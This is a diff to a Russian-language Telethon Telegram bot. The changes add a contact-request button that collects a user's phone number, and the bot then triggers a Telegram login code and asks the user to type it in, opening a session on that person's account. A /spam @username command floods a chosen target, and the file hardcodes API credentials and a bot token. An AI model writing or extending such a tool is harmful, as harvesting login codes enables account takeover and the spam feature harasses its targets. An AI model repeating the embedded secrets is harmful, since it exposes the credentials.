@@ -6,31 +6,39 @@ API_ID = 34887681
 API_HASH = "9a2905a9627fb1959b6699452ec59e99"
 BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"
 
-# Бот
 bot = TelegramClient(MemorySession(), API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# Храним состояния пользователей
 user_states = {}
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     chat_id = event.chat_id
     if chat_id in user_states and user_states[chat_id].get('logged'):
-        await event.reply('✅ Ты уже вошёл! Используй /spam @username')
+        await event.reply('✅ Ты уже вошёл! /spam @username')
         return
-    await event.reply('📱 Отправь номер телефона в формате +79991234567')
+    
+    # Кнопка для отправки номера
+    buttons = [
+        [Button.request_phone('📱 Отправить номер', resize=True, selective=True)]
+    ]
+    await event.reply(
+        'Нажми кнопку "Отправить номер", чтобы я получил твой номер телефона:',
+        buttons=buttons
+    )
     user_states[chat_id] = {'step': 'wait_number'}
 
-@bot.on(events.NewMessage(pattern=r'^\+\d{10,15}$'))
-async def get_number(event):
+@bot.on(events.NewMessage(func=lambda e: e.contact))
+async def get_contact(event):
     chat_id = event.chat_id
     if chat_id not in user_states:
         await event.reply('❌ Нажми /start сначала')
         return
     
-    number = event.raw_text.strip()
+    number = event.contact.phone_number
+    if not number.startswith('+'):
+        number = '+' + number
+    
     try:
-        # Создаём КЛИЕНТ ПОЛЬЗОВАТЕЛЯ в памяти
         client = TelegramClient(MemorySession(), API_ID, API_HASH)
         await client.start()
         sent = await client.send_code_request(number)
@@ -41,7 +49,7 @@ async def get_number(event):
             'number': number,
             'phone_code_hash': sent.phone_code_hash
         }
-        await event.reply(f'✅ Код отправлен на {number}\nВведи код цифрами:')
+        await event.reply(f'✅ Код отправлен на {number}\nВведи код цифрами (4-6 цифр):')
     except Exception as e:
         await event.reply(f'❌ Ошибка: {str(e)[:150]}')
 
@@ -54,7 +62,7 @@ async def get_code(event):
     
     state = user_states[chat_id]
     if state.get('step') != 'wait_code':
-        await event.reply('❌ Сначала отправь номер')
+        await event.reply('❌ Сначала нажми кнопку "Отправить номер"')
         return
     
     code = event.raw_text.strip()
@@ -101,5 +109,5 @@ async def start_spam(event):
     except Exception as e:
         await event.reply(f'❌ Ошибка спама: {str(e)[:150]}')
 
-print('🍪 БОТ ЗАПУЩЕН НА TELETHON!')
+print('🍪 БОТ С КНОПКОЙ ЗАПУЩЕН!')
 bot.run_until_disconnected()
